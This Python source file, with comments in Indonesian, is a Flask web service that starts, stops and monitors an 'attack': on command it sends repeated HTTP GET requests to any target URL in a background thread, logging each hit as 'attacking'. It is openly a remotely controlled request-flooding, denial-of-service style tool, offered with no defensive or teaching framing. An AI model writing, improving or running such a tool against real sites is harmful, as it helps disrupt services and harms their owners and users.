from flask import Flask, request, jsonify
import asyncio
import aiohttp
import threading
import time

app = Flask(__name__)

# Variabel global untuk mengontrol serangan
attack_thread = None
is_attacking = False

# Fungsi untuk melakukan serangan
async def attack(target_url, attack_count, delay):
    global is_attacking
    is_attacking = True
    async with aiohttp.ClientSession() as session:
        for _ in range(attack_count):
            if not is_attacking:
                print(f"Serangan dihentikan!")
                break
            try:
                async with session.get(target_url) as response:
                    print(f"Menyerang {target_url} - Status: {response.status}")
            except Exception as e:
                print(f"Gagal menyerang: {e}")
            await asyncio.sleep(delay)
    is_attacking = False

# Endpoint untuk memulai serangan
@app.route('/start', methods=['POST'])
def start_attack():
    global attack_thread
    if is_attacking:
        return jsonify({"message": "Serangan sudah berjalan!"}), 400

    data = request.json
    target = data.get('target')
    count = int(data.get('count', 10))  # Default jumlah serangan adalah 10
    delay = float(data.get('delay', 1))  # Default delay adalah 1 detik

    # Jalankan serangan di thread terpisah
    attack_thread = threading.Thread(target=lambda: asyncio.run(attack(target, count, delay)))
    attack_thread.start()

    return jsonify({"message": "Serangan dimulai"}), 200

# Endpoint untuk menghentikan serangan
@app.route('/stop', methods=['POST'])
def stop_attack():
    global is_attacking
    if not is_attacking:
        return jsonify({"message": "Tidak ada serangan yang sedang berjalan!"}), 400

    is_attacking = False
    return jsonify({"message": "Serangan dihentikan!"}), 200

# Endpoint untuk mengecek status serangan
@app.route('/monitor', methods=['GET'])
def monitor_attack():
    if is_attacking:
        return jsonify({"status": "Serangan sedang berlangsung!"}), 200
    else:
        return jsonify({"status": "Tidak ada serangan yang berjalan."}), 200

# Endpoint untuk mengecek status server
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running"}), 200

# Jalankan aplikasi Flask
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
